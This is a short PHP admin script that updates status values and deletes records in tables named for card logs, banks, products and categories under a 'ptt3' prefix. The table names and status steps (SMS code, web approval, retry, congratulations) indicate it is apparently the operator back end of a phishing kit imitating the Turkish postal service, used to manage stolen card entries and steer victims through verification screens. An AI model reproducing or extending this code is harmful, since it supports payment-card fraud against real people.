<?php
include("../db/connect.php");
include("../db/koru.php");


if ($_GET['islem'] == "sms") {
  $sql = $baglanti->prepare("UPDATE logs SET durum=? WHERE id=?");
  $sonuc = $sql->execute(["sms", $_GET['id']]);
}

if ($_GET['islem'] == "tebrik") {
  $sql = $baglanti->prepare("UPDATE logs SET durum=? WHERE id=?");
  $sonuc = $sql->execute(["tebrik", $_GET['id']]);
}

if ($_GET['islem'] == "tekrar") {
    $sql = $baglanti->prepare("UPDATE logs SET durum=? WHERE id=?");
    $sonuc = $sql->execute(["tekrar", $_GET['id']]);
}

if ($_GET['islem'] == "webonay") {
    $sql = $baglanti->prepare("UPDATE logs SET durum=? WHERE id=?");
    $sonuc = $sql->execute(["webonay", $_GET['id']]);
}

if ($_GET['islem'] == "hsms") {
    $sql = $baglanti->prepare("UPDATE logs SET durum=? WHERE id=?");
    $sonuc = $sql->execute(["hsms", $_GET['id']]);
}

if ($_GET['islem'] == "error") {
    $sql = $baglanti->prepare("UPDATE logs SET durum=? WHERE id=?");
    $sonuc = $sql->execute(["error", $_GET['id']]);
}

if ($_GET['islem'] == "sil") {
    if($_GET['tur'] == "kart"){
        $sql = $baglanti->prepare("DELETE FROM bella_ptt3_logs WHERE id = ?");
        $sql->execute([$_GET["id"]]);
    }
    if($_GET['tur'] == "urun") {
        $sql = $baglanti->prepare("DELETE FROM bella_ptt3_urunler WHERE id = ?");
        $sql->execute([$_GET["id"]]);
    }
    if($_GET['tur'] == "banka") {
        $sql = $baglanti->prepare("DELETE FROM bella_ptt3_banka WHERE id = ?");
        $sql->execute([$_GET["id"]]);
    }
    if($_GET['tur'] == "cat") {
        $sql = $baglanti->prepare("DELETE FROM bella_ptt3_kategori WHERE id = ?");
        $sql->execute([$_GET["id"]]);
    }
}
header("location:index.php");
?>